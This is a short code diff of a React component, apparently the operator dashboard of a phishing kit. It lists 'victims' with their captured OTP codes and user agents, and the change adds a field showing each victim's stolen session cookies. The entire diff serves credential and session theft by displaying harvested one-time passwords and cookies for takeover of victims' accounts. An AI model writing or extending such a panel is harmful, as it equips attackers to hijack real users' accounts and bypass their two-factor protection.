@@ -52,7 +52,6 @@ function Victimlst() {
     if (data == "") {
       return (
         <div className="flex items-center justify-center flex-col">
-          <h1 className="text-4xl">waiting for lovely users</h1>
           <DNA
             visible={true}
             height="120"
@@ -77,6 +76,7 @@ function Victimlst() {
                   action={victim.action}
                   OTP={victim.OTP}
                   user_agent={victim.user_agent}
+                  Cookies={victim.Cookies}
                 />
               </li>
 
